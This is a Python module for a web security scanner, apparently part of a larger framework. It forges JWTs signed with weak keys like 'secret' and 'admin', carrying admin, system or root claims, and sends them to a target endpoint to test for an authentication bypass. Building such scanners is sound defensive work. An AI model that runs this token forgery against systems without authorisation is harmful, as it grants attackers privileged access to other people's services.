"""JWT Authentication Bypass Scanner"""

from typing import Dict, List, Optional, Any
import requests
import jwt
import uuid
from datetime import datetime
from urllib.parse import urljoin
from .base_scanner import BaseScanner
from .utils.logger import setup_scanner_logger

class JWTScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("jwt")
        self.context = {}
        self.target = None
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        vulnerabilities = []
        
        # Set target URL for make_request method
        self.target = url
        
        # Store context if provided
        if context:
            self.context = context
            self.logger.info(f"Received context with {len(context)} items")
            
            # Use finding IDs from previous scans for dependency tracking
            dependencies = context.get('finding_ids', [])
            self.logger.info(f"Using {len(dependencies)} dependencies from previous findings")
            
            # Use credentials discovered by other scanners
            credentials = context.get('credentials', [])
            self.logger.info(f"Using {len(credentials)} credentials from other scanners")
        else:
            dependencies = []
        
        # Generate correlation ID for tracking related requests
        correlation_id = str(uuid.uuid4())
        
        # Common weak keys to test
        weak_keys = [
            "secret",
            "key",
            "private",
            "1234567890",
            "password",
            "admin"
        ]
        
        # Test payloads
        test_payloads = [
            {"sub": "admin", "role": "admin"},
            {"sub": "system", "role": "system"},
            {"sub": "root", "role": "superuser"}
        ]
        
        for weak_key in weak_keys:
            for payload in test_payloads:
                try:
                    # Create forged token
                    forged_token = jwt.encode(payload, weak_key, algorithm="HS256")
                    
                    # Track authentication state
                    auth_state = {
                        "token": forged_token,
                        "auth_type": "bearer",
                        "weak_key": weak_key
                    }
                    
                    # Test the forged token
                    test_headers = {"Authorization": f"Bearer {forged_token}"}
                    
                    # Use urljoin to properly construct the URL
                    test_url = urljoin(url, path)
                    test_resp = requests.get(
                        test_url,
                        headers=test_headers,
                        timeout=5
                    )
                    
                    # Capture transaction for evidence
                    request_data, response_data = self.capture_transaction(
                        test_resp,
                        auth_state=auth_state,
                        correlation_id=correlation_id
                    )
                    
                    if test_resp.status_code == 200:
                        finding = {
                            "type": "JWT_WEAK_KEY",
                            "severity": "CRITICAL",
                            "detail": f"Successfully forged JWT token using weak key: {weak_key}",
                            "evidence": {
                                "jwt_request": request_data,
                                "jwt_response": response_data,
                                "auth_state": auth_state,
                                "correlation_id": correlation_id,
                                "weak_key": weak_key,
                                "payload": payload
                            },
                            "dependencies": dependencies,
                            "context_update": {
                                "vulnerable_jwt_endpoints": self.context.get("vulnerable_jwt_endpoints", []) + [path],
                                "weak_keys": self.context.get("weak_keys", []) + [weak_key]
                            }
                        }
                        vulnerabilities.append(finding)
                        self.logger.warning(f"Found JWT weak key vulnerability: {weak_key}")
                        
                except Exception as e:
                    self.logger.error(f"Error testing JWT weak key {weak_key}: {str(e)}")
                    
        return vulnerabilities

scan = JWTScanner().scan
